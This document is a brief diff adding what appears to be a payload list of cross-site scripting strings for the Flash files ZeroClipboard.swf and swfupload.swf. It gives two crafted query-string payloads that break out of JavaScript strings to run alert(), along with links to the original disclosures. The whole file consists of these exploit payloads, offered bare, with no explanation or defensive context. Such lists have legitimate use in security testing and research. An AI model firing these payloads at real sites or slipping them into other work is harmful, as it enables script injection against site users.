@@ -1,0 +1,8 @@
+zeroclipboard.swf XSS vulnerabilities in ZeroClipboard 
+ZeroClipboard.swf?id=\%22))}catch(e){(alert)(/XSS/.source);}//&width=500&height=500
+http://seclists.org/fulldisclosure/2013/Feb/103
+
+swfupload.swf
+swfupload.swf?movieName=aaa%22])}catch(e){(alert)(1)};//
+
+http://www.freebuf.com/sectool/108568.html
